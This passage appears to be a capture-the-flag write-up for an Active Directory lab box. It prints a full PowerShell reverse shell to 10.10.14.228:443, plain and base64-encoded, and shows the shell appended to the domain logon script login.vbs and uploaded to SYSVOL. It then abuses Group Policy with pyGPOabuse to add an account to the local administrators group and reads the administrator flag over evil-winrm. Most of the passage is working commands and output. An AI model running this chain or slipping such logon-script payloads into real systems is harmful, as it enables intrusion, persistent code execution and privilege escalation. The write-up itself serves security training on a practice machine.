kASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsA  
JABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQ  
A6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBl  
AGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA%
```

```bash
>  cp login.vbs.bak payload.vbs  
B64=$(iconv -f ASCII -t UTF-16LE /tmp/revshell.ps1 | base64 -w0)  
printf '\nSet cmdshell = CreateObject("Wscript.Shell")\ncmdshell.Run "powershell -nop -w hidden -enc %s", 0, False\n' "$B64" >> payload.vbs  
>  cat payload.vbs  
Sub MapNetworkShare(sharePath, driveLetter)  
   Dim objNetwork  
   Set objNetwork = CreateObject("WScript.Network")       
    
   ' Check if the drive is already mapped  
   Dim mappedDrives  
   Set mappedDrives = objNetwork.EnumNetworkDrives  
   Dim isMapped  
   isMapped = False  
   For i = 0 To mappedDrives.Count - 1 Step 2  
       If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then  
           isMapped = True  
           Exit For  
       End If  
   Next  
      
   If isMapped Then  
       objNetwork.RemoveNetworkDrive driveLetter & ":", True, True  
   End If  
      
   objNetwork.MapNetworkDrive driveLetter & ":", sharePath  
      
   If Err.Number = 0 Then  
       WScript.Echo "Mapped " & driveLetter & ": to " & sharePath  
   Else  
       WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description  
   End If  
      
   Set objNetwork = Nothing  
End Sub  
  
MapNetworkShare "\\dc.baby2.vl\apps", "V"  
MapNetworkShare "\\dc.baby2.vl\docs", "L"  
Set cmdshell = CreateObject("Wscript.Shell")  
cmdshell.Run "powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMgAyA  
DgAJwAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACA  
APQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZ  
QAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgA  
xACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9A  
CAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGI  
AeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA", 0, False
```

We got our payload, and since we initially put port 443 as the listener, we'll open it to get a reverse shell :

```bash
>  sudo nc -lvnp 443  
Please touch the FIDO authenticator.  
Listening on 0.0.0.0 443
```

And then we copy the payload where the login is via SMB :

```bash
>  smbclient //10.129.13.186/SYSVOL -U 'Carl.Moore%Carl.Moore' -c 'cd baby2.vl/scripts; put payload.vbs login.vbs; ls'  
  
putting file payload.vbs as \baby2.vl\scripts\login.vbs (11.3 kB/s) (average 11.3 kB/s)  
 .                                   D        0  Mon Aug 25 10:30:39 2025  
 ..                                  D        0  Tue Aug 22 19:43:55 2023  
 login.vbs                           A     2431  Fri Jun  5 17:35:37 2026  
  
               6126847 blocks of size 4096. 1961742 blocks available
```

We got a connection, but no shell, so we retry :

```bash
>  rm -rf /tmp/revshell.ps1  
>  echo -n '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.228",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data =  
(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBy  
tes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' > /tmp/revshell.ps1  
wc -c /tmp/revshell.ps1  
500 /tmp/revshell.ps1  
>  cp login.vbs.bak payload.vbs  
B64=$(iconv -f ASCII -t UTF-16LE /tmp/revshell.ps1 | base64 -w0)  
printf '\nSet cmdshell = CreateObject("Wscript.Shell")\ncmdshell.Run "cmd.exe /c start /b powershell -nop -w hidden -enc %s", 0, False\n' "$B64" >> payload.vbs  
python3 -c "import re; t=open('payload.vbs').read(); m=re.search(r'-enc ([^\"]+)', t); print('b64 len:', len(m.group(1)))"  
b64 len: 1336  
```

And the same things happens, so we reset the box (10.129.234.72 was the old target).

We re-make the payload and upload it as `login.vbs` again with listener 443 on :

```bash
>  smbclient //10.129.13.186/SYSVOL -U 'Carl.Moore%Carl.Moore' -c 'cd baby2.vl/scripts; put payload.vbs login.vbs; ls'  
  
putting file payload.vbs as \baby2.vl\scripts\login.vbs (14.2 kB/s) (average 14.2 kB/s)  
 .                                   D        0  Mon Aug 25 10:30:39 2025  
 ..                                  D        0  Tue Aug 22 19:43:55 2023  
 login.vbs                           A     2451  Fri Jun  5 18:07:33 2026  
  
               6126847 blocks of size 4096. 1050933 blocks available
```

This time, `login.vbs` is larger for some reason.

But we still just get a connection :

```bash
>  sudo rlwrap -cAr nc -lvnp 443  
Please touch the FIDO authenticator.  
Listening on 0.0.0.0 443  
Connection received on 10.129.13.186 58259
```

And it refused to get the shell again, same issue. PowerShell.

So we'll try to get the user flag without a shell :

```bash
Set sh = CreateObject("Wscript.Shell")  
sh.Run "cmd.exe /c whoami > \\dc.baby2.vl\apps\dev\who.txt", 0, True  
sh.Run "cmd.exe /c copy /Y C:\user.txt \\dc.baby2.vl\apps\dev\user.txt", 0, True  
EOF  
>  tail -6 payload.vbs  
  
MapNetworkShare "\\dc.baby2.vl\apps", "V"  
MapNetworkShare "\\dc.baby2.vl\docs", "L"  
Set sh = CreateObject("Wscript.Shell")  
sh.Run "cmd.exe /c whoami > \\dc.baby2.vl\apps\dev\who.txt", 0, True  
sh.Run "cmd.exe /c copy /Y C:\user.txt \\dc.baby2.vl\apps\dev\user.txt", 0, True  
>  smbclient //10.129.13.186/SYSVOL -U 'Carl.Moore%Carl.Moore' -c 'cd baby2.vl/scripts; put payload.vbs login.vbs; ls'  
putting file payload.vbs as \baby2.vl\scripts\login.vbs (7.8 kB/s) (average 7.8 kB/s)  
 .                                   D        0  Mon Aug 25 10:30:39 2025  
 ..                                  D        0  Tue Aug 22 19:43:55 2023  
 login.vbs                           A     1182  Fri Jun  5 18:13:08 2026  
  
               6126847 blocks of size 4096. 1112388 blocks available
               
>  smbclient //10.129.13.186/apps -U 'Carl.Moore%Carl.Moore' -c 'cd dev; ls; get who.txt; get user.txt'  
cat who.txt  
cat user.txt  
 .                                   D        0  Fri Jun  5 18:13:25 2026  
 ..                                  D        0  Thu Sep  7 21:12:59 2023  
 CHANGELOG                           A      108  Thu Sep  7 21:16:15 2023  
 login.vbs.lnk                       A     1800  Thu Sep  7 21:13:23 2023  
 user.txt                            A       32  Wed Apr 16 11:48:10 2025  
 who.txt                             A       24  Fri Jun  5 18:13:25 2026  
  
               6126847 blocks of size 4096. 1136013 blocks available  
getting file \dev\who.txt of size 24 as who.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
getting file \dev\user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
baby2\amelia.griffiths  
42783b************5c38%
```

And fuck you PowerShell, we got the user flag and the user : amelia.griffiths.

We see on `bloodhound` that Amelia has no direct Outbound Control Rights but as a member of the group Legacy, she has `WriteOwner` and `WriteDacl` on `GPOADM` and `GPO-MANAGEMENT`.

We reinitialize the payload now, and add a `powershell.exe` script at the end :

```bash
>  cp login.vbs.bak payload.vbs  
  
>  cat >> payload.vbs << 'EOF'  
Set sh = CreateObject("Wscript.Shell")  
sh.Run "powershell.exe -nop -w hidden -ep bypass -File \\dc.baby2.vl\apps\dev\run-gpoadm.ps1", 0, True  
EOF  
```

Then, we write the powershell script to put it inside the machine via Carl.Moore's SMB to get to `GPOADM` :

```bash
>  smbclient //10.129.13.186/apps -U 'Carl.Moore%Carl.Moore' -c 'cd dev; put /tmp/PowerView.ps1 PowerView.ps1; put /tmp/run-gpoadm.ps1 run-gpoadm.ps1; ls'  
  
putting file /tmp/PowerView.ps1 as \dev\PowerView.ps1 (103.0 kB/s) (average 103.0 kB/s)  
putting file /tmp/run-gpoadm.ps1 as \dev\run-gpoadm.ps1 (1.7 kB/s) (average 100.6 kB/s)  
 .                                   D        0  Fri Jun  5 18:27:57 2026  
 ..                                  D        0  Thu Sep  7 21:12:59 2023  
 CHANGELOG                           A      108  Thu Sep  7 21:16:15 2023  
 gpoadm-done.txt                     A       60  Fri Jun  5 18:33:26 2026  
 login.vbs.lnk                       A     1800  Thu Sep  7 21:13:23 2023  
 PowerView.ps1                       A   770279  Fri Jun  5 18:33:44 2026  
 run-gpoadm.ps1                      A      307  Fri Jun  5 18:33:45 2026  
 user.txt                            A       32  Wed Apr 16 11:48:10 2025  
 who.txt                             A       24  Fri Jun  5 18:26:23 2026  
  
               6126847 blocks of size 4096. 1359421 blocks available                         A      143  Fri Jun  5 18:26:49 2026
```

And we rebuild the login payload :

```bash
cat >> payload.vbs << 'EOF'  
Set sh = CreateObject("Wscript.Shell")  
sh.Run "powershell.exe -nop -w hidden -ep bypass -File \\dc.baby2.vl\apps\dev\run-gpoadm.ps1", 0, True  
EOF  
tail -5 payload.vbs  
wc -c payload.vbs  
End Sub  
  
MapNetworkShare "\\dc.baby2.vl\apps", "V"  
MapNetworkShare "\\dc.baby2.vl\docs", "L"Set sh = CreateObject("Wscript.Shell")  
sh.Run "powershell.exe -nop -w hidden -ep bypass -File \\dc.baby2.vl\apps\dev\run-gpoadm.ps1", 0, True  
1134 payload.vbs  
>  smbclient //10.129.13.186/SYSVOL -U 'Carl.Moore%Carl.Moore' -c 'cd baby2.vl/scripts; put payload.vbs login.vbs; ls'  
  
putting file payload.vbs as \baby2.vl\scripts\login.vbs (5.4 kB/s) (average 5.4 kB/s)  
 .                                   D        0  Mon Aug 25 10:30:39 2025  
 ..                                  D        0  Tue Aug 22 19:43:55 2023  
 login.vbs                           A     1134  Fri Jun  5 18:35:21 2026  
  
               6126847 blocks of size 4096. 1379427 blocks available
```

And we get GPO-ADM access :

```bash
>  nxc smb dc.baby2.vl -u GPOADM -p 'Scrow123&'  
smbclient //10.129.13.186/apps -U 'Carl.Moore%Carl.Moore' -c 'cd dev; get gpoadm-done.txt'  
cat ~/gpoadm-done.txt  
SMB         10.129.13.186   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.13.186   445    DC               [+] baby2.vl\GPOADM:Scrow123&    
getting file \dev\gpoadm-done.txt of size 60 as gpoadm-done.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)  
��done baby2\amelia.griffiths

>  nxc winrm 10.129.13.186 -u GPOADM -p 'Scrow123&'  
WINRM       10.129.13.186   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)    
WINRM       10.129.13.186   5985   DC               [-] baby2.vl\GPOADM:Scrow123&
```

We got the login working, no shell though.

From here, we go on `bloodhound` and find "6AC1786C-016F-11D2-945F-00C04FB984F9" from `DEFAULT DOMAIN POLICY` as the GUID for `GPOADM`.

We'll run `pyGPOabuse` to try to escalate :

```bash
>  python3 ~/pyGPOAbuse/pygpoabuse.py baby2.vl/GPOADM:'Scrow123&' -gpo-id 6AC1786C-016F-11D2-945F-00C04FB984F9 -command 'net localgroup administrators GPOADM /add' -f  
  
[+] ScheduledTask TASK_30a864d9 created!

>  nxc winrm 10.129.13.186 -u GPOADM -p 'Scrow123&'  
WINRM       10.129.13.186   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)    
WINRM       10.129.13.186   5985   DC               [-] baby2.vl\GPOADM:Scrow123&
```

It seems we got the wrong GUID, so we'll do an ldapsearch for it :

```bash
>  ldapsearch -x -H ldap://dc.baby2.vl -D 'baby2\GPOADM' -w 'Scrow123&' -b 'CN=Policies,CN=System,DC=baby2,DC=vl' '(objectClass=groupPolicyContainer)' cn displayName  
  
# extended LDIF  
#  
# LDAPv3  
# base <CN=Policies,CN=System,DC=baby2,DC=vl> with scope subtree  
# filter: (objectClass=groupPolicyContainer)  
# requesting: cn displayName    
#  
  
# {31B2F340-016D-11D2-945F-00C04FB984F9}, Policies, System, baby2.vl  
dn: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=baby2,D  
C=vl  
cn: {31B2F340-016D-11D2-945F-00C04FB984F9}  
displayName: Default Domain Policy  
  
# {6AC1786C-016F-11D2-945F-00C04fB984F9}, Policies, System, baby2.vl  
dn: CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=baby2,D  
C=vl  
cn: {6AC1786C-016F-11D2-945F-00C04fB984F9}  
displayName: Default Domain Controllers Policy  
  
# search result  
search: 2  
result: 0 Success  
  
# numResponses: 3  
# numEntries: 2
```

There is another GUID, we'll retry :

```bash
>  python3 ~/pyGPOAbuse/pygpoabuse.py baby2.vl/GPOADM:'Scrow123&' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command 'net localgroup administrators GPOADM /add' -f  
  
[+] ScheduledTask TASK_3fbf4c6d created!

>  nxc winrm 10.129.13.186 -u GPOADM -p 'Scrow123&'  
WINRM       10.129.13.186   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)    
WINRM       10.129.13.186   5985   DC               [+] baby2.vl\GPOADM:Scrow123& (Pwn3d!)
```

And we got it ! We got added to `localgroup administrators`.

```bash
>  evil-winrm -i 10.129.13.186 -u GPOADM -p 'Scrow123&'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\gpoadm\Documents> cd /  
*Evil-WinRM* PS C:\> ls  
  
  
   Directory: C:\  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----         4/16/2025   2:27 AM                inetpub  
d-----          5/8/2021   1:20 AM                PerfLogs  
d-r---         4/16/2025   1:51 AM                Program Files  
d-----         8/22/2023  10:30 AM                Program Files (x86)  
d-----         8/22/2023   1:10 PM                shares  
d-----         8/22/2023  12:35 PM                temp  
d-r---          6/5/2026   9:55 AM                Users  
d-----         8/20/2025   9:05 AM                Windows  
-a----         4/16/2025   2:48 AM             32 user.txt  
  
  
*Evil-WinRM* PS C:\> cd /Users  
*Evil-WinRM* PS C:\Users> ls  
  
  
   Directory: C:\Users  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----         8/22/2023  10:08 AM                Administrator  
d-----         4/16/2025   2:24 AM                Amelia.Griffiths  
d-----          6/5/2026   9:55 AM                gpoadm  
d-r---         8/22/2023  10:08 AM                Public  
  
  
*Evil-WinRM* PS C:\Users> cd /Users/Administrator/Desktop  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt  
2935009**********5740f9
```

And rooted !
